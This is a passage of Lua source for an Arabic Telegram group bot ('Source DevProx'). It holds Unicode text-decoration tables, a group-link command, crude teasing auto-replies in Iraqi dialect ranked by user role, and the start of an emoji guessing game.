"Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆,K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,0,9,8,7,6,5,4,3,2,1,.,_",     
"۪۫a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,۪۫y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,۪۪۫۫,0۪۪۫۫,9۪۪۫۫,8۪۪۫۫,7۪۪۫۫,6۪۪۫۫,5۪۪۫۫,4۪۪۫۫,3۪۪۫۫,2۪۪۫۫,1۪۪۫۫,.۪۪۫۫,_",     
"͜͡Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,ؔؔ͜͜Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,͜͡0,9,8,7,6,5,4,3,2,1,.,_",     
"A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,̶̶A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"𝐀,𝐁,𝐂,𝐃,𝐄,𝐅,𝐆,𝐇,𝐈,𝐉,𝐊,𝑳,𝐌,𝐍,𝐎,𝐏,𝐐,𝐑,𝐒,𝐓,𝐔,𝐕,𝐖,𝐗,𝐘,𝐙,𝐀,𝐁,𝐂,𝐃,𝐄,𝐅,𝐆,𝐇,𝐈,𝐉,𝐊,𝑳,𝐌,𝐍,𝐎,𝐏,𝐐,𝐑,𝐒,𝐓,𝐔,𝐕,𝐖,𝐗,𝐘,𝐙,0,9,8,7,6,5,4,3,2,1,.,_",
"𝐴,b,𝐶,𝐷,𝐸,𝐹,𝐺,𝐻,𝐼,𝐽,𝐾,𝐿,𝑀,𝑁,𝑂,𝑃,𝑄,𝑅,𝑆,𝑇,𝑈,𝑉,𝑊,𝑋,𝑌,𝑍,𝐴,b,𝐶,𝐷,𝐸,𝐹,𝐺,𝐻,𝐼,𝐽,𝐾,𝐿,𝑀,𝑁,𝑂,𝑃,𝑄,𝑅,𝑆,𝑇,𝑈,𝑉,𝑊,𝑋,𝑌,𝑍,0,9,8,7,6,5,4,3,2,1,.,_",
"𝙰,𝙱,𝙲,𝙳,𝙴,𝙵,𝙶,𝙷,𝙸,𝙹,𝙺,𝙻,𝙼,𝙽,𝙾,𝙿,𝚀,𝚁,𝚂,𝚃,𝙺,𝚅,𝚆,𝚇,𝚈,𝚉,𝙰,𝙱,𝙲,𝙳,𝙴,𝙵,𝙶,𝙷,𝙸,𝙹,𝙺,𝙻,𝙼,𝙽,𝙾,𝙿,𝚀,𝚁,𝚂,𝚃,𝙺,𝚅,𝚆,𝚇,𝚈,𝚉,0,9,8,7,6,5,4,3,2,1,.,_",
"ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ᴈ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ᴓ,ʀ,ᴤ,ᴛ,ᴜ,ᴠ,ᴡ,ᴥ,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ᴈ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ᴓ,ʀ,ᴤ,ᴛ,ᴜ,ᴠ,ᴡ,ᴥ,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",
"𝙖,𝙗,𝙘,𝙙,𝙚,𝙛,𝙜,𝙝,𝙞,𝙟,𝙠,𝙡,𝙢,𝙣,𝙤,𝙥,𝙦,𝙧,𝙨,𝙩,𝙪,𝙫,𝙬,𝙭,𝙮,𝙯,𝙖,𝙗,𝙘,𝙙,𝙚,𝙛,𝙜,𝙝,𝙞,𝙟,𝙠,𝙡,𝙢,𝙣,𝙤,𝙥,𝙦,𝙧,𝙨,𝙩,𝙪,𝙫,𝙬,𝙭,𝙮,𝙯,0,9,8,7,6,5,4,3,2,1,.,_",
"Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     }         
local result = {}     
i=0     
for k=1,#fonts do     
i=i+1     
local tar_font = fonts[i]:split(",")     
local text = ABS_PROX    
local text = text:gsub("A",tar_font[1])     
local text = text:gsub("B",tar_font[2])     
local text = text:gsub("C",tar_font[3])     
local text = text:gsub("D",tar_font[4])     
local text = text:gsub("E",tar_font[5])     
local text = text:gsub("F",tar_font[6])  
local text = text:gsub("G",tar_font[7])    
local text = text:gsub("H",tar_font[8])    
local text = text:gsub("I",tar_font[9])     
local text = text:gsub("J",tar_font[10])     
local text = text:gsub("K",tar_font[11])     
local text = text:gsub("L",tar_font[12])     
local text = text:gsub("M",tar_font[13])     
local text = text:gsub("N",tar_font[14])     
local text = text:gsub("O",tar_font[15])     
local text = text:gsub("P",tar_font[16])     
local text = text:gsub("Q",tar_font[17])     
local text = text:gsub("R",tar_font[18])     
local text = text:gsub("S",tar_font[19])     
local text = text:gsub("T",tar_font[20])     
local text = text:gsub("U",tar_font[21])     
local text = text:gsub("V",tar_font[22])     
local text = text:gsub("W",tar_font[23])     
local text = text:gsub("X",tar_font[24])     
local text = text:gsub("Y",tar_font[25])     
local text = text:gsub("Z",tar_font[26])     
local text = text:gsub("a",tar_font[27])     
local text = text:gsub("b",tar_font[28])     
local text = text:gsub("c",tar_font[29])     
local text = text:gsub("d",tar_font[30])     
local text = text:gsub("e",tar_font[31])     
local text = text:gsub("f",tar_font[32])     
local text = text:gsub("g",tar_font[33])     
local text = text:gsub("h",tar_font[34])     
local text = text:gsub("i",tar_font[35])     
local text = text:gsub("j",tar_font[36])     
local text = text:gsub("k",tar_font[37])     
local text = text:gsub("l",tar_font[38])     
local text = text:gsub("m",tar_font[39])     
local text = text:gsub("n",tar_font[40])     
local text = text:gsub("o",tar_font[41])     
local text = text:gsub("p",tar_font[42])     
local text = text:gsub("q",tar_font[43])     
local text = text:gsub("r",tar_font[44])     
local text = text:gsub("s",tar_font[45])     
local text = text:gsub("t",tar_font[46])     
local text = text:gsub("u",tar_font[47])     
local text = text:gsub("v",tar_font[48])     
local text = text:gsub("w",tar_font[49])     
local text = text:gsub("x",tar_font[50])     
local text = text:gsub("y",tar_font[51])     
local text = text:gsub("z",tar_font[52])     
local text = text:gsub("0",tar_font[53])     
local text = text:gsub("9",tar_font[54])     
local text = text:gsub("8",tar_font[55])     
local text = text:gsub("7",tar_font[56])     
local text = text:gsub("6",tar_font[57])     
local text = text:gsub("5",tar_font[58])     
local text = text:gsub("4",tar_font[59])     
local text = text:gsub("3",tar_font[60])     
local text = text:gsub("2",tar_font[61])     
local text = text:gsub("1",tar_font[62])            
table.insert(result, text)     
end     
local DevAbs22 = "☬︙ٱڵكڵمة { "..ABS_PROX.." }\n☬︙تـۖمت زخرفتهٱ ٱڵى ( "..tostring(#fonts).." ) نوع \n☬︙ٱضـغط عڵى ٱڵـكڵمة ڵـنسخهٱ\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
number=0     
for v=1,#result do     
number=number+1     
local ABS_PROX = {' ۞ ',' ☊ ',' ❥˓ ',' ﴿ֆ ',' ✟ ',' ߷ ',' 彡 ',' 𒀭꙰ ',' ⧫ ',' ✠ ',' 〄 ',' あ ', ' ঌ ',' 𖤍 ',' 𖣴 ',' ➺ ',' ᤑ ',' ✹ ',' ⚚ ', ' 𓃠 ',' ⇣ ',' 𖢑 ',' ₎ۦ˛ ',' ♩ ',' ༗.',' ⇣✦ ',' ⇡ ',' 𖢃 ',' 𖢄 ',' 𖢅 ',' 𖢝 ',' 𖢜 ',' 𖢒 ',' 𖢌 ' }   
DevAbs22 = DevAbs22..''..number.."  `"..result[number]..''..ABS_PROX[math.random(#ABS_PROX)].."`\n\n"    
end     
Dev_Abs(msg.chat_id_, 0, 1, DevAbs22, 1, 'md')     
end     
end 
--     Source DevProx     --
if DevAbs:get(DevProx.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
DevAbs:del(DevProx.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAbs:set(DevProx.."DevText", DevText)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفظ كڵيشة ٱڵـمطۄر", 1, "md")
end
if text and text:match("^(.*)$") then
local ABS_PROX = DevAbs:get('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حفظ ٱسم ٱڵـبـۄت ', 1, 'html')
DevAbs:set('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
DevAbs:set('ABS_PROX:'..bot_id..'name_bot', text)
return false 
end
end
--     Source DevProx     --
if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")

else  
--     Source DevProx     --
if text:match("^الرابط$") and Abbas_Abs(msg) then
if not DevAbs:get(DevProx.."bot:tt:link:"..msg.chat_id_) then 
local link = DevAbs:get(DevProx.."bot:group:link"..msg.chat_id_)
if link then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..link, 1, "html")
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لم يتم تعيين رآبط ٱڵمجمۄعة \n☬︙ٱرسڵ (ضع رابط) ڵلتعيين', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*جڵب رٱبط ٱڵمجمۄعة معطڵ*', 1, 'md')
end
end
end 
--     Source DevProx     --
if text:match("^انجب$") or text:match("^نجب$") or text:match("^انجبي$") or text:match("^نجبي$") or text:match("^انجبو$") or text:match("^نجبو$") then
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
function rd_anshb(extra,result,success)
if tonumber(result.id_) == tonumber(DevId) then
rd = 'مطوريي اغلط شكد متريد نورتنه ، ♥️💪🏿'
elseif is_sudoid(result.id_) then
rd = 'مطوريي اغلط شكد متريد نورتنه ، ♥️💪🏿'
elseif is_sudo3(result.id_) then
rd = 'احترم نفسكك لا عبالكك رافعيك مطور ، 🖕🏿♥️'
elseif is_monsh(result.id_, msg.chat_id_) then
rd = 'تاج راسيي انت المنشئ الاساسي ،🖐🏿♥️'
elseif is_monshid(result.id_, msg.chat_id_) then
rd = 'حبيبي المنشئ استقبلها منكك ،👍🏿♥️'
elseif is_ownerall(result.id_) then
rd = 'حبيبي راح اسامحكك لان مدير وع راسي ، 🖐🏿♥️'
elseif is_adminall(result.id_) then
rd = 'راح اسامحكك هلمره لانك ادمن ، ☝🏿♥️'
elseif is_vipall(result.id_) then
rd = 'راح احترمكك تره بس هلمره لانك مميز عندي ، ☝🏿♥️'
elseif is_donky(result.id_, msg.chat_id_) then
rd = 'هم رافعيكك مطي وهم تغلط ؟، 🖐🏿♥️'
elseif is_owner(result.id_, msg.chat_id_) then
rd = 'حبيبي راح اسامحكك لان مدير وع راسي ، 🖐🏿♥️'
elseif is_admin(result.id_, msg.chat_id_) then
rd = 'راح اسامحكك هلمره لانك ادمن ، ☝🏿♥️'
else
rd = 'لكك هوه انت عضو وجاي تغلط ؟، 🖕🏿♥️'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,''..rd..'', 1, 'html')
end 
getUser(msg.sender_user_id_,rd_anshb)
end end
if text == 'دي' or text == 'ديي' or text == 'دي بابه' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "آخـلُِآقٌڪڪ لُِڪڪ 𖠙 😒🔪" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'السلام عليكم' or text == 'سلام عليكم' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "يٱھَہّلْـٱٱ ۅﻋ̝̚لْـيڪْم ٱلْـﺳ̭͠ لْـٱم 𖠙 🤤♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭😭😭' or text == '😭😭😭😭' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "مآآعٍآشُ آلُِي يزعٍلُِڪڪ 𖠙 😏♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "شبّـيي ٱﻟ̣̣ـפﻟ̣̣ـو 𖠙 😿💔" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "أُرٌجُعُ عٍيدِهـآآ مٍوو تنِْسةه 𖠙 🤤♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then local ABS_PROX = {  "اࠗط็ـلق֯ق֯ هٞللاࠗ୨و 𖠙 🤤♥️" ,  "هۂَلٱٱ نۨــہٰورتت يۧعمۘريۧ 𖠙 🤤♥️" } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' or text == 'شلون الاخبار' or text == 'شخبارك' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then  local ABS_PROX = {  "مٱﺷ͠ يةھَہّ يـﻋ̝̚مريي ۅٱﻧـﺗ̲ـت 𖠙 🤤♥️" ,  "ٱلحۡمۘدللهۂَ ٰوٱنۨــہتت 𖠙 🤤♥️",  "تمۘٱمۘ عمۘريۧ ٰوٱنۨــہتت 𖠙 🤤♥️", } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text == 'وينك' or text == 'وينج' then  if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "مْوٌجہوٌدِ يہمْگُ يحڵوُ 𖠙 😉♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'بوت عواي' or text == 'بوت زربه' or text == 'البوت عاوي' or text == 'البوت زربه' then  if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "اطردكك تجرب ؟ ، 😕🔪" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'نايمين' or text == 'ميتين' then  if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "طُآمسين ووعٍيوونڪ 𖠙 😪🖤ۦ" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'هلوباي' or text == 'هلو باي' then  if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "شحۡسۜيت مۘنۨــہ هيجۚ ּكتبت ؟ 🌝♥️" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ 𖠙 😉♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'فرخ' then  if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "ٰويۧنۨــہهۂَ خۡل ٱحۡصرهۂَ 𖠙 😹♥️" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'سورس عبس' or text == 'سورس بروكس' or text == 'سورس ديف بروكس' or text == 'سورس زربه' or text == 'السورس زربه' or text == 'سورس عاوي' or text == 'السورس عاوي' then if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "لُِآ سوورس خـآلُِتڪ دِي لُِڪ 𖠙 😒🔪" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end 
--     Source DevProx     --
if text == 'بوت' or text == 'بوتت' then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local ABS_PROX = {  "ڵتكول بوت ٱسمي "..name_bot.." 😒🔪",  "عندي ٱسم تره 😒💔",  "صيحوڵي "..name_bot.." كٱفي بوت 😒🔪",  "ٱنت ٱڵبوت ڵك 😒💔", } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه'  then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local ABS_PROX = {  "مرحبٱ عزيزي 😻♥️ \nٱسمي "..name_bot.." 😚♥️",  "هلاا يروحيي وياكك "..name_bot.." 😻♥️", } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end
if text ==  ""..name_bot..' احبك' or text ==  ""..name_bot..' احبج' then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local ABS_PROX = {  "اعشقكك يروح "..name_bot.." 😻♥️",  "جعل محد غيركك يحبني 😻♥️" } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end
if (text and text == (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس')) then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local namebot = {  '😸♥️ هلٱ كڵبي ويٱك '..name_bot..' تفضڵ',  'ترةه مصختهٱا ٱحجيي شرٱيد 😕😒💔',  'ٱطڵقق وٱحدد يصيح '..name_bot..' 😻♥️',  'خبصتت ٱمنةة شتريدد عٱاد 🤧😒💔' } name = math.random(#namebot) Dev_Abs(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
--     Source DevProx     --
if text =='نقاطي' and Abbas_Abs(msg) then 
if tonumber((DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevAbs0 = '☬︙ڵيس ڵديك نقٱط ٱڵعب ٱولٱ \n☬︙ٱرسڵ ( الالعاب ) ڵڵعب'
Dev_Abs(msg.chat_id_, msg.id_, 1,DevAbs0, 1, 'md')
else 
ABS_PROX = '☬︙ڵديك { '..(DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..' } من نقٱط ٱڵعب '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
end
if text ==  'حذف رسائلي' and Abbas_Abs(msg) or text ==  'مسح رسائلي' and Abbas_Abs(msg) then DevAbs:del('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حذف رسٱئڵك ٱڵمضٱفة', 1, 'md') end
--     Source DevProx     --
if text == 'سمايلات' and Abbas_Abs(msg) or text == 'السمايلات' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(DevProx..'bot:l:ids'..msg.chat_id_)
DevAbs2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
